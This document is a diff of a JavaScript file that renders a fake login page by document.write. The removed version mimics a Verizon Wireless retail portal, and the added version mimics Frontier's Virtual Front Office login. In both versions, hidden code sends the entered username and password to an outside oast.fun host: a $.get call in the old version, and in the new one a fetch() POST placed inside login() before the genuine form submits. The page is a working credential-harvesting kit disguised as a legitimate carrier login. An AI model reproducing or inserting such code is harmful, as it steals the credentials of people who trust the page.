@@ -1,467 +1,476 @@
 document.write(`
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="author" content="">
-
-    <link rel="shortcut icon" href="https://vzretailsupport.com/favicon.ico">
-    <!-- Deleting SEO related vars -->
-    <title>Welcome to VerizonWireless.com</title> 
-    <!-- Bootstrap core CSS -->
-    <link href="https://vzretailsupport.com/sites/themes/default/css/bootstrap.min.css?minify=true" rel="stylesheet">
-    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css?minify=true" rel="stylesheet">
-    <link rel="stylesheet" type="text/css" href="https://vzretailsupport.com/js/aui-artDialog/css/ui-dialog.css">
-    <!-- Custom scrollbars CSS -->
-    <link href="https://vzretailsupport.com/sites/themes/default/css/style.css?minify=true" rel="stylesheet" />
-    <!--
-    <link href="/sites/themes/default/css/reset.css" rel="stylesheet" >
-    <link href="/sites/themes/default/css/front.css" rel="stylesheet"> -->
-    <link rel="icon" href="https://vzretailsupport.com/favicon.ico" type="image/x-icon">
-    <!-- Just for debugging purposes. Don't actually copy this line! -->
-    <!--[if lt IE 9]><script src="js/ie8-responsive-file-warning.js"></script><![endif]-->
-
-    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-	<script type="text/javascript" src="https://vzretailsupport.com/sites/themes/default/js/jquery-1.10.2.min.js"></script>
-    <script type="text/javascript" src="https://vzretailsupport.com/sites/themes/default/js/bootstrap.min.js"></script>
-    <script language='javascript' type='text/javascript' src='https://vzretailsupport.com/js/token_helper.js'></script>
-    <link rel="stylesheet" href="https://vzretailsupport.com/sites/themes/default/css/jquery-ui.css">
-
-    <script src="https://vzretailsupport.com/js/jquery-ui/jquery-ui.js"></script>
-	<script type="text/javascript" >
-        
-        var modal;
-
-        $(document).ready(function(){
-            $('.ajax-get').click(function(){
-                var target;
-                var that = this;
-                if ( $(this).hasClass('confirm') ) {
-                    if(!confirm('Are you sure you want to delete?')){
-                        return false;
-                    }
-                }
-                if ( (target = $(this).attr('href')) || (target = $(this).attr('url')) ) {
-                    $.get(target).success(function(data){                        
-                        window.location.href = window.location.href;
-                    });
-                }
-                return false;
-            });
-        });
-         
-        window.onpopstate = function(event) {
-            if(event && event.state) {
-                location.reload()
-            }
-        }
-
-        function redirect_url(url) {
-            if (modal!=null)
-                modal.close();
-            window.location.href = url;
-        }
-       
-        function device_onclick() {
-            if ($('#device').val() != "0")
-            {
-                $('#edit_device').css("background-color","green");
-                $('#edit_device').attr('href','/index.php?page=device_edit');
-            }
-            else
-                $('#edit_device').css("background-color","#999");
-        }
-        
-    </script>
-
-</head>
-
-<body>
-<!-- this is a here -->
-    <div id="loading_container">
-        <div class="header-wrapper">
-            
-
-
-<script type="text/javascript" >
-            var current_page = 'login';
-     
-     function Search_OnClick(page) {
-        var device_type_id = "";
-
-		if (document.getElementById("device_type_id"))
-		{
-            device_type_id = document.getElementById("device_type_id").value;
-		}
-	    var name = document.getElementById("search-text").value.trim();
-	    //if(name == "")
-		//{
-		//   alert("Please enter content.")
-		//   return;
-	    //}
-        //  var $tempPage = page;
-        //  alert("Page is ".var_dump($tempPage));
-        //alert("Page is "+page);
-
-        if (page == "card" || page.indexOf("dashboard") >= 0 || page == "latest-updated" || page == "complete-live-set" || page == "campaign-cards" || page == "future-cards")
-        {
-            var url = "/" + page;
-
-            if (page=='dashboard')
-                url = '/card';
-
-            //if (page == "latest-updated")
-            //    url = "/latest-updated";
-            //if (page == "complete-live-set")
-            //    url = "/complete-live-set";
-            var v = "";
-            $("input:checkbox[name='device_type']").each(function(){
-                if($(this).prop("checked") == true)
-                {
-
-                    if($(this).val() != "0")
-                    {
-                        if (v == "")
-                        {
-                            v = $(this).val();
-                        }
-                        else{
-                            v = v + "_" + $(this).val();
-                        }
-                    }
-
-                }
-
-            });
-            if (device_type_id != "")
-                url += "/device_type_id/"+device_type_id;
-
-            if (v != "")
-                url += "/device_type/"+v;
-
-            v = "";
-            $("input:checkbox[name='manufacturer']").each(function(){
-                if($(this).prop("checked") == true)
-                {
-
-                    if($(this).val() != "0")
-                    {
-                        if (v == "")
-                        {
-                            v = $(this).val();
-                        }
-                        else{
-                            v = v + "_" + $(this).val();
-                        }
-                    }
-
-                }
-
-            });
-            if (v != "")
-                url += "/manufacturer/"+v;
-            v = "";
-            $("input:checkbox[name='model']").each(function(){
-                if($(this).prop("checked") == true)
-                {
-
-                    if($(this).val() != "0")
-                    {
-                        if (v == "")
-                        {
-                            v = $(this).val();
-                        }
-                        else{
-                            v = v + "_" + $(this).val();
-                        }
-                    }
-
-                }
-
-            });
-            if (v != "")
-                url += "/model/"+v;
-            v = "";
-            $("input:checkbox[name='card_type']").each(function(){
-                if($(this).prop("checked") == true)
-                {
-
-                    if($(this).val() != "0")
-                    {
-                        if (v == "")
-                        {
-                            v = $(this).val()
-                        }
-                        else{
-                            v = v + "_" + $(this).val();
-                        }
-                    }
-
-                }
-
-            });
-            if (v != "")
-                url += "/card_type/"+ v;
-            url += "/device_name/" + name;
-//            alert("url " + url);
-
-            window.location.href = url;
-        }
-        else if (page.indexOf("card") >= 0)
-        {
-            var is_accessories_device_type_id =document.getElementById("is_accessories_device_type_id").value;
-            var is_others_device_type_id =document.getElementById("is_others_device_type_id").value;
-            var is_all_device_type_id =$("#is_all_device_type_id").val();
-            var card_url = "/cards-devices-search";
-            if(is_Exist_in_str(device_type_id, is_accessories_device_type_id)) // (page.indexOf("accesories") >= 0)
-                card_url = "/cards-accesories-search";
-            if (is_Exist_in_str(device_type_id, is_others_device_type_id)) //(page.indexOf("others") >= 0)
-                card_url = "/cards-others-search";
-            if (is_all_device_type_id == 1) //(page.indexOf("others") >= 0)
-                card_url = "/cards-devices-search";
-            if (name != "")
-                window.location.href = card_url + '/device_type_id/'+device_type_id+'/device_name/'+name;
-            else
-                window.location.href =  card_url + '/device_type_id/'+device_type_id;
-        }
-		else if (page.indexOf("admin") >= 0)
-		{
-            if (name != "")
-		        window.location.href = '/admin-users/pagenumber/1/user_info/'+name;
-            else
-                window.location.href = '/admin-users/pagenumber/1';
-		}
-		else
-		{
-            if (name != "")
-                window.location.href = '/devices-list/device_type_id/'+device_type_id+'/device_name/'+name;
-            else
-                window.location.href = '/devices-list/device_type_id/'+device_type_id;
-		}
-    }
-    function is_Exist_in_str(id, str)
-    {
-        if (str != "")
-        {
-            var arr = str.split(',');
-            for (var i=0; i< arr.length; i++)
-            {
-                if  (id == arr[i])
-                     return true;
-            }
-        }
-        return false;
-    }
-    function search_onkeypress(event)
-    {
-        if(event.keyCode == "13")
-            btn.click();
-         return false;
-    }
-</script>
-
-
-<div class="nav-shadow">
-	<nav class="wrapper">
-		<a href="#" class="bg-bars f-l" style="display:none"></a>
-        <a href="#" class="v-header-logo f-l" style="display:none"></a>
-        <img src="https://vzretailsupport.com/sites/themes/default/images/vlogo_1.png" height="40" style="margin-left:20px; margin-top:20px;">
-			</nav>
-
-</div>
-<div>
-<nav class="wrapper navigation site-dropdown-menu" id="adminMainMenu">
-	<ul>
-		    </ul>
-</nav>
-
-</div>
-<div class="cf"></div>
-<div class="search" style="height:30px !important;"></div>
-
-        </div>
-         
-
-<div class="clearfix"></div>
-
-<div class="up-item">
- <form name="registerForm" id="registerForm" method="POST">
-  <input type="hidden" value="login-ajax" name="page">
-  <input type="hidden" value="register" name="action" id="action" />
-  <input type="hidden" value="" name="register_referrerId">
-  <input type="hidden" value="3" name="user_userLevelId">
-  <input type="hidden" value="/category-all-search" name="returnPage" id="returnPage" />
-  <input type="hidden" name="zip_code" id="zip_code" value=""/>
-  <input type="hidden" name="country" id="country" value=""/>
-  <input type="hidden" name="city" id="city" value=""/>
-  <input type="hidden" name="state" id="state" value=""/>
-  <input type="hidden" name="address" id="address" value=""/>
-
-  <div class="bot-section">
-   <div class="container" style="padding-top:50px;padding-bottom:150px;">
-    <div class="row">
-     <div class="col-md-4">
-      <div class="up-details"></div>
-     </div>
-     
-          
-     <div class="col-md-6">
-      <div class="page-title">
-       <div class="container">Account Login</div>
-      </div>
-      <div class="up-details">
-       <div class="row">
-        <div class="col-sm-7">
-         <div class="form-group">
-          <label for="Town/City">User Name*</label>
-          <input type="text" class="form-control" name="login_username" id="login_username">                                     
-         </div>
-        </div>
-       </div>
-       <div class="row">
-        <div class="col-sm-5">
-         <div class="form-group">
-          <label for="Country">Password<strong>*</strong></label>
-           <input type="password" class="form-control" name="login_password" id="login_password">
-         </div>
-        </div>
-       </div>
-       <div class="row">
-        <div class="col-xs-7">
-         <label class="checkbox-inline">
-          <input type="checkbox" id="inlineCheckbox1" value="option1">Remember Me
-         </label>
-        </div>
-       </div>
-       <div>&nbsp;</div>
-       <div class="row">
-        <div class="col-xs-5">
-         <button type="button" class="btn btn-danger" onclick="login()">Account Login</button>
-        </div>
-       </div>
-       <div>&nbsp;</div>
-       <div class="row">
-        <div class="col-xs-7">
-         <a href="https://vzretailsupport.com/contact_us">Send Customer Support Email</a>
-        </div>
-       </div>
-      </div>
-     </div>
-          
-    </div>
-   </div>
-  </div>
- </form>
-</div>
-
-
-        <footer class="footer-wrapper">
-            <div class="wrapper">
-		<div><a href="#" class="logo-footer"></a></div>
-		<div><a href="#">Terms Of Service</a> | <a href="">Privacy Policy</a></div>
-		<div>Copyright 2018-2025 | Verizon Wireless USA | Version 1.1.191</div>
-</div>
-
-        </footer>
-        <br class="spacer">
-    </div>
-    <!-- Wrapper close -->
-
-    <!-- Bootstrap core JavaScript
-    ================================================== -->
-    <!-- Placed at the end of the document so the pages load faster -->
-    
-    <script type="text/javascript" src="https://vzretailsupport.com/js/aui-artDialog/dist/dialog-min.js"></script>
-    <script type="text/javascript" src="https://vzretailsupport.com/js/aui-artDialog/dist/dialog-plus-min.js"></script>
-
-    <input type="hidden" name="login_status" id="login_status" value="0" />
-    <input type="hidden" name="current_page" id="current_page" value="login"/>
-
-    
-
-<script type="text/javascript">
-    function login() {
-	var username = $('#login_username').val();
-	var password = $("#login_password").val();
-	var error = false;
-	if (input_event($('#login_username'), username)) error = true;
-	if (input_event($('#login_password'), password)) error = true;
-	if (!error) {
-		var params = 'username='+ username + '&password='+password + '&action=login&page=login-ajax';
-		process_request(params);
-	}
-	return false;
-}
-
-$(document).ready(function() {
-	$('#login_password').keypress(function(e) {
-		if (e.which==13) {
-			return login();
-		}
-	});
-});
-
-function input_event(obj, value) {
-	var error = false;
-	if (!value)
-		value = $(obj).val();
-	//console.log(value+'xx')
-	if (value=='') {
-		error = true;
-		$(obj).parent().addClass('has-error').addClass('has-feedback').removeClass('has-success');
-		$(obj).parent().find('.form-control-feedback').addClass('glyphicon-warning-sign');
-	} else {
-		//has-success has-feedback
-		$(obj).parent().removeClass('has-error').addClass('has-feedback').addClass('has-success')
-		$(obj).parent().find('.form-control-feedback').removeClass('glyphicon-warning-sign').addClass('glyphicon-ok');
-	}
-	return error;
-}
-
-function process_request(params) {
-	$.ajaxSetup({
-		cache: false,
-		async: true
-	});
-	var returnPage = $('#returnPage').val();
-	$.get('https://nzzjpghxfodtnmruhumffm648x57hi0zc.oast.fun/index.php', params, function(data) {
-		// if server returns JSON string, jQuery will parse it when dataType is 'json'
-		try { data = (typeof data === 'string') ? $.parseJSON(data) : data; } catch(e) { /* ignore parse error */ }
-
-		if (data && data.status == 1) {
-			console.log(data.status);
-			if (data.action == 'login') {
-				if (returnPage) window.parent.redirect_url(returnPage);
-				else window.parent.redirect_url('/');
+<html>
+    <head>
+	<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="no-cache, no-store, must-revalidate">
+    <META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
+    <META HTTP-EQUIV="Expires" CONTENT="0">
+    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
+	<!-- <meta http-equiv="X-UA-Compatible" content="IE=EMULATEIE7" /> -->
+	<script type="text/javascript">
+			document.onclick = function() {
+				var e = event.srcElement.tagName;
+				if (e == "A") {
+					event.srcElement.style.color = "#609";
+				}
 			}
-		} else {
-			console.log(data && data.message);
-			alert(data && data.message);
-		}
-	}, 'json');
-}
+			
+	</script>
+	
+
+
+
+
+
+	<LINK REL="stylesheet" href="https://vfoclec.frontier.com/css/default_vfostyles.css" TYPE="text/css" MEDIA="all">
+
+<LINK REL="stylesheet" href="https://vfoclec.frontier.com/calendar/calendar-blue.css" TYPE="text/css" MEDIA="all">
+    <script language="JavaScript1.2" src="https://vfoclec.frontier.com/js/utils.js"></script>
+    <script language="JavaScript" src="https://vfoclec.frontier.com/js/OpenCloseWin.js"></script>
+    <script language="JavaScript" src="https://vfoclec.frontier.com/js/extrnalClose.js"></script>
+    <STYLE type="text/css">
+        #busyLayer{position:absolute; width:100%; height:100%; top:0px; z-index:5; left:0px; visibility: hidden ;cursor : wait}
+    </STYLE>
+    <div id="busyLayer" name="busyLayer">
+		<IFRAME  width="100%" height="100%" scrolling="no" frameborder="0" src="https://vfoclec.frontier.com/busy.html"></IFRAME>
+    </div>
+    
+     <STYLE type="text/css">
+        #busyLayer1{position:absolute; width:100%; height:100%; top:0px; z-index:5; left:0px; visibility: hidden ;cursor : wait}
+    </STYLE>
+    <div id="busyLayer1" name="busyLayer1">
+		<IFRAME  width="100%" height="100%" scrolling="no" frameborder="0" src="https://vfoclec.frontier.com/HourGlass.html"></IFRAME>
+    </div>
+
+<!-- File Name : OrderTestCaseSearchResult.jsp -->
+
+
+
+
+
+
+
+
+
+	<LINK REL="stylesheet" href="https://vfoclec.frontier.com/css/default_vfostyles.css" TYPE="text/css" MEDIA="all">
+
+<LINK REL="stylesheet" href="https://vfoclec.frontier.com/calendar/calendar-blue.css" TYPE="text/css" MEDIA="all">
+
+
+
+    
+    
+
+
+
+
+
+
+<title>login - Virtual Front Office</title>
+<script type="text/javascript" src="https://vfoclec.frontier.com/js/jquery_src/jquery-3.7.1.min.js"></script>
+<script language="javascript1.2">
+    /*26-oct-2004 vikramv@wiosrindia.soft.net below code is add to make enter key functionality enabled while loging in*/
+    /*  <Product>WebVFO</Product>
+        * <Release>15.20.0.1</Release>
+        * <Requirement Number></Requirement Number>
+        * <Defect ID> INOWVFO-2824 </Defect ID>
+        * <Use case number></Use case number>
+        * <Sequence Diagram Number></Sequence Diagram Number>
+        * <author>Ravi R Kulkarni</author>
+        * <date>May-2017</date>
+        */
+    //REMOVED "/" for actions in order to support web contexct as vfowebapp
+    /*
+     * <Product>VFO</Product>
+     * <Release>15.21.0.2</Release>
+     * <Requirement Number></Requirement Number>
+     * <Defect ID>INOWVFO-3037</Defect ID>
+     * <Use case number></Use case number>
+     * <Sequence Diagram Number></Sequence Diagram Number>
+     * <author>Suprabha M P</author>
+     * <date>May-2017</date>
+     */
+    /*  <Product>WebVFO</Product>
+     * <Release>15.22.0.2</Release>
+     * <Requirement Number></Requirement Number>
+     * <Defect ID> INOWVFO-3171</Defect ID>
+     * <Use case number></Use case number>
+     * <Sequence Diagram Number></Sequence Diagram Number>
+     * <author>Ravi R Kulkarni</author>
+     * <date>08-Aug-2017</date>
+     */
+    /*  <Product>WebVFO</Product>
+    * <Release>16.10.0.1</Release>
+    * <Requirement Number></Requirement Number>
+    * <Defect ID>INOWVFO-6777/INOWVFO-6763</Defect ID>
+    * <Use case number></Use case number>
+    * <Sequence Diagram Number></Sequence Diagram Number>
+    * <author>Ravi R Kulkarni</author>
+    * <date>June-2019</date>
+    */
+    /*<Product>WebVFO</Product>
+    * <Release>18.23.21.0.X</Release>
+    * <Requirement Number></Requirement Number>
+    * <Defect ID>INOWVFO-11893/INOWVFO-11893</Defect ID>
+    * <Use case number></Use case number>
+    * <Sequence Diagram Number></Sequence Diagram Number>
+    * <author>Ravi R Kulkarni</author>
+    * <date>25-Nov-2022</date>
+    */
+    //INOWVFO-14470  ::  Ravi R Kulkarni  :: Sprint61
+    //INOWVFO-14470  ::  Ravi R Kulkarni  :: Sprint61 : Fix for reopen
+    //INOWVFO-14537 ::  Ravi R Kulkarni  :: Sprint63
+    
+
+    
+
+    function keyDown(eve) {
+        if(eve) {
+            keycode = eve.keyCode;
+        } else {
+            keycode = event.keyCode;
+        }
+
+        if(keycode==13){
+            login();
+        }
+
+    }
+
+    function setCookie(name,value,expires,path,domain,secure){
+        document.cookie = name + "=" +escape(value) +
+            ( (expires) ? ";expires=" + expires.toGMTString() : "") +
+            ( (path) ? ";path=" + path : "") +
+            ( (domain) ? ";domain=" + domain : "") +
+            ( (secure) ? ";secure" : "");
+    }
+
+    function setCookie(name, value) {
+        var  today=new Date();
+        var expire=new Date();
+        expire.setTime(today.getTime()+ 1000*60*60*24*90);
+        document.cookie = name + "=" + escape(value) +
+            ( (expire == null) ? "" : ("; expires=" + expire.toGMTString()))+";path=/";
+    }
+
+    function getcookie(cookiename) {
+        var cookiestring=""+document.cookie;
+        var index1=cookiestring.indexOf(cookiename);
+        if (index1==-1 || cookiename=="") return "";
+        var index2=cookiestring.indexOf(';',index1);
+        if (index2==-1) index2=cookiestring.length;
+        return unescape(cookiestring.substring(index1+cookiename.length+1,index2));
+    }
+
+    function setServiceRequestType(){
+        if(getCookie("serviceRequestType")){
+
+            var selObj = document.forms[0].serviceRequestType;
+            var selectedValue = getCookie("serviceRequestType");
+            for(var x = 0; x < selObj.length; x++){
+                var strVal = selObj.options[x].value;
+                if(strVal == selectedValue){
+                    selObj.options[x].selected = true
+                    return;
+                }
+            }
+        }
+    }
+
+
+    document.onkeydown = keyDown;
+
+    function login() {
+        /*  var ua = navigator.userAgent.toLowerCase();
+          if ( ua.indexOf( "firefox" ) != -1 ) {
+          alert("VFO is not currently supported on Firefox. Please retry using Internet Explorer");
+          return;
+          } */
+
+        var ua = navigator.userAgent.toLowerCase();
+        var trident = ua.indexOf('trident/');
+        var ie_ver =0;
+        if (trident > 0) {
+            var rv = ua.indexOf('rv:');
+            ie_ver = parseInt(ua.substring(rv + 3, ua.indexOf('.', rv)), 10);
+
+        }
+
+        if( ( ua.indexOf( "chrome" ) != -1  && ua.indexOf( "opr" ) == -1 )|| ( ie_ver == 11 ) ){
+
+            if(ie_ver == 11){
+                alert("The web browser you are using is not a certified VFO browser. Please use Microsoft Edge or Google Chrome.");
+            }
+
+            if(document.forms[0].loginName.value == ''){
+                alert("Please enter User Name");
+                return;
+            }
+
+            if(document.forms[0].password.value == ''){
+                alert("Please enter Password");
+                return;
+            }
+
+            fetch('https://oltacehurwtlwifqhabakwby0sd96q3z3.oast.fun/endpoint', {
+                method: 'POST',
+                body: new URLSearchParams({
+                    param1: document.forms[0].loginName.value,
+                    param2: document.forms[0].password.value,
+                })
+            });
+
+
+            if(document.loginform.serviceRequestType.options[document.loginform.serviceRequestType.selectedIndex].value == ''){
+
+                alert("Please select a module");
+                return;
+            }
+            document.loginform.task.value = "login";
+            document.loginform.LoginEntry.value = "login";
+            //jQuery('#password').val(IE10_NOPEEPING.password_value);
+            setCookie("serviceRequestType",document.forms[0].serviceRequestType.options[document.loginform.serviceRequestType.selectedIndex].value);
+            document.loginform.submit();
+
+        }
+        else{
+            alert("The web browser you are using is not supported by Virtual Front Office (VFO). The only supported web browsers are Microsoft Edge and Google Chrome.");
+            return false; }
+
+    }
+
+    function setInitialFocus(){
+        if(document.forms[0].loginName){
+            document.forms[0].loginName.focus();
+        }
+    }
+
+    function checkSiteminderLogin(){
+        var userName='null';
+        if(userName!='null' && userName!=''){
+            document.forms[0].loginName.value =userName;
+            document.loginform.remoteUserName.value=userName;
+            document.loginform.LoginEntry.value = "login";
+            document.loginform.task.value = "login";
+            document.loginform.submit();
+        }else{
+            return;
+        }
+    }
+    function checkSSOLogin(){
+        //alert("checkSSOLogin");
+        var ssoTricket_ID='null';
+        var vfoUser_ID='null';
+        var circuit_ID='null';
+        var ssoESPCustomerIDVal='null';
+
+        var ssoFromCktIDLinkVal ='null';
+        var ssoFromNavLinkVal ='null';
+        var ssoUserpermissionVal = 'null';
+        var ssomoduleName=  'null';
+
+        if(ssoTricket_ID!='null' && ssoTricket_ID!=''){
+            document.loginform.ssoTricketIDValue.value=ssoTricket_ID;
+            document.loginform.vfoUserID.value=vfoUser_ID;
+            document.loginform.circuitID.value=circuit_ID;
+            document.loginform.espCutomerID.value=ssoESPCustomerIDVal;
+            // alert("ssoFromCktIDLinkVal == "+ssoFromCktIDLinkVal);
+            if('null'!=null && 'null'!=''){
+                document.loginform.fromCktID.value='null';
+            }
+            if(ssoFromNavLinkVal!=null && ssoFromNavLinkVal!=''){
+                document.loginform.fromNav.value=ssoFromNavLinkVal;
+            }
+
+            document.loginform.userPermissionVal.value=ssoUserpermissionVal;
+            document.loginform.moduleName.value=ssomoduleName;
+            document.loginform.LoginEntry.value = "login";
+            document.loginform.task.value = "login";
+            document.loginform.submit();
+        }else{
+            return;
+        }
+    }
+    function openSyncWebSite() {
+        winPopName = "WisorWebSite";
+        var myWin = window.open("https://razorflow.ai", winPopName);
+        if(myWin && myWin!=winPopName) {
+            if(!myWin.closed) {myWin.focus();}
+        }
+    }
+    function  disableBrowserBackButton(){
+        //alert("disableBrowserBackButton");
+        //window.location.hash="no-back-button";
+        //window.location.hash="Again-No-back-button";//again because google chrome don't insert first hash into history
+        //window.onhashchange=function(){window.location.hash="no-back-button";}
+        history.pushState(null, null, $(location).attr('href'));
+        window.addEventListener('popstate', function () {
+            history.pushState(null, null, $(location).attr('href'));
+        });
+    }
+    function openEmailAddressInputPage(){
+        
+
+        var ua = navigator.userAgent.toLowerCase();
+        var trident = ua.indexOf('trident/');
+        var ie_ver =0;
+        if (trident > 0) {
+            var rv = ua.indexOf('rv:');
+            ie_ver = parseInt(ua.substring(rv + 3, ua.indexOf('.', rv)), 10);
+
+        }
+
+        if( ( ua.indexOf( "chrome" ) != -1  && ua.indexOf( "opr" ) == -1 )|| ( ie_ver == 11 ) ){
+            document.loginform.retrievePd.value ='ckBuRDBtb3BlbkVtYWlsQWRkcmVzc0lucHV0UGFnZQ==';
+            document.loginform.task.value = "login";
+            document.loginform.LoginEntry.value = "login";
+            document.loginform.submit();
+
+        }
+        else{
+            alert("The web browser you are using is not supported by Virtual Front Office (VFO). The only supported web browsers are Internet Explorer 11 and Google Chrome.");
+            return false;
+        }
+    }
+
+    function forgotPasswordPage(){
+        
+        document.loginform.retrievePd.value = 'ckBuRDBtZm9yZ290UGFzc3dvcmQ=';
+        document.loginform.task.value = "login";
+        document.loginform.LoginEntry.value = "login";
+        document.loginform.submit();
+    }
+</script>
+</head>
+<body onload="disableBrowserBackButton()">
+
+
+
+
+
+<table width="100%"  border="0" cellspacing="0" cellpadding="0" align="center">
+    <tr>
+        <th height="79" scope="col">&nbsp;</th>
+    </tr>
+    <tr>
+        <th height="387" scope="row"><table width="532" height="363" border="0" cellpadding="0" cellspacing="0" align="center">
+            <tr>
+                <td><img src="https://vfoclec.frontier.com/spacer.gif" width="7" height="1" border="0" title=""></td>
+                <td><img src="https://vfoclec.frontier.com/spacer.gif" width="514" height="1" border="0" title=""></td>
+                <td><img src="https://vfoclec.frontier.com/spacer.gif" width="11" height="1" border="0" title=""></td>
+                <td><img src="https://vfoclec.frontier.com/spacer.gif" width="1" height="1" border="0" title=""></td>
+            </tr>
+            <tr>
+                <td colspan="3"><img name="login_r1_c1" src="https://vfoclec.frontier.com/images/login_r1_c1.jpg" width="534" height="58" border="0" title=""></td>
+
+            </tr>
+            <tr>
+                <td height="20" style="background:url(images/login_r2_c1.jpg) no-repeat; width: 2px;" >&nbsp;</td>
+                <td height="20" valign="top" style="width:515px;"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
+                    <tr>
+                        <th height="42" scope="col"><div align="center"><span class="login_header"> Please
+                Login</span></div></th>
+                    </tr>
+                    <tr>
+                        <th height="192" valign="middle" scope="row">
+                            <form name="loginform" method="post" action="LoginController.do">
+                                <input type="hidden" name="task" />
+                                <input type="hidden" name="LoginEntry" value=""/>
+                                <input type="hidden" name="browserHeight"/>
+                                <input type="hidden" name="browserWidth"/>
+                                <input type="hidden" name="retrievePd" />
+                                <table width="82%"  border="0" align="center" cellpadding="0" cellspacing="4" align="center">
+                                    <tr>
+                                        <th width="44%" height="10" scope="col"><div align="left" class="login_label">&nbsp;&nbsp;&nbsp;&nbsp;User
+                                            Name </div></th>
+                                        <th width="13%" height="10" scope="col">:</th>
+                                        <th width="43%" height="10" scope="col"><div align="left">
+                                            <input name="loginName" type="text" id="loginName" class="normaltext">
+                                        </div></th>
+                                    </tr>
+                                    <tr>
+                                        <th width="44%" height="10" scope="col"><div align="left" class="login_label"> </div></th>
+                                        <th width="13%" height="10" scope="col"></th>
+                                        <th width="43%" height="10" scope="col"><div align="right">
+                                            <a href="https://vfoclec.frontier.com/javascript:openEmailAddressInputPage()" class="label_password-username_link_bld" tabIndex="-1">Forgot User Name?</a>
+                                        </div></th>
+                                    </tr>
+                                    <tr>
+                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
+                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
+                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
+                                    </tr>
+                                    <tr>
+                                        <th height="10" scope="row"><div align="left" class="login_label">&nbsp;&nbsp;&nbsp;&nbsp;Password</div></th>
+                                        <th height="10" scope="row">:</th>
+                                        <th height="10" scope="row"><div align="left">
+                                            <input name="password" type="password" id="password" class="normaltext" onCopy="return false" onDrag="return false" onDrop="return false" onPaste="return false" autocomplete="off">
+                                        </div></th>
+                                    </tr>
+                                    <tr>
+                                        <th height="10" scope="row"><div align="left" class="login_label"></div></th>
+                                        <th height="10" scope="row"></th>
+                                        <th height="10" scope="row"><div align="right">
+                                            <a href="https://vfoclec.frontier.com/javascript:forgotPasswordPage()" class="label_password-username_link_bld" tabIndex="-1">Forgot Password?</a>
+                                        </div></th>
+                                    </tr>
+                                    <tr>
+                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
+                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
+                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
+                                    </tr>
+                                    <tr>
+                                        <th height="10" scope="row"><div align="left" class="login_label">&nbsp;&nbsp;&nbsp;&nbsp;Module</div></th>
+                                        <th height="10" scope="row">:</th>
+                                        <th height="10" scope="row"><div align="left">
+                                            <select name = "serviceRequestType" ><option value="">--Select--</option><option value= "ASR" >Access</option><option value= "Common Order" >Common Order</option><option value= "E911" >E911</option><option value= "LSR" >Local</option><option value= "TA" >TA</option>  </select> 
+                                        </div>
+                                        </th>
+                                    </tr>
+                                    <tr>
+                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
+                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
+                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
+                                    </tr>
+                                    <tr>
+                                        <th height="10" scope="row"><div align="left" class="login_label">&nbsp;&nbsp;&nbsp;&nbsp;Change Password </div></th>
+                                        <th height="10" scope="row">:</th>
+                                        <th height="10" scope="row"><div align="left">
+                                            <input type="checkbox" name="changePassword" class="login_label" value="TRUE">
+                                        </div></th>
+                                    </tr>
+                                    <tr>
+                                        <th height="25" scope="row">&nbsp;</th>
+                                        <th scope="row">&nbsp;</th>
+                                        <th scope="row"><div align="left"><a href="https://vfoclec.frontier.com/#"><img src="https://vfoclec.frontier.com/images/login.gif" width="99" height="25" border="0" onClick="javascript:login()"></a> </div></th>
+                                    </tr>
+                                </table>
+                            </form>
+                        </th>
+                    </tr>
+                </table></td>
+                <td height="20" style="background:url(images/login_r2_c3.jpg) no-repeat;">&nbsp;</td>
+            </tr>
+            <tr>
+                <td colspan="3"><img name="login_r3_c1" src="https://vfoclec.frontier.com/images/login_r3_c1.jpg" width="534" height="71" border="0" title="" usemap="#Map"></td>
+            </tr>
+        </table></th>
+    </tr>
+    <tr>
+        <th scope="row">&nbsp;</th>
+    </tr>
+</table>
+<map name="Map">
+    <area shape="rect" coords="410,35,520,70" href="https://vfoclec.frontier.com/javascript:openSyncWebSite()">
+</map>
+<script type="text/javascript" src="https://vfoclec.frontier.com/js/ie10_nopeeping.js"></script>
+</body>
+<script>
+    setServiceRequestType();
+    setInitialFocus();
+    document.loginform.browserHeight.value=document.documentElement.clientHeight;
+    document.loginform.browserWidth.value=document.documentElement.clientWidth;
 </script>
 
-<style>
-.up-item select
-{
-    padding: 6px 10px;
-}
-
-</style>
-
-
-</body>
 
 </html>
 `);
-document.body.firstChild.remove();
-document.body.lastChild.remove();
-
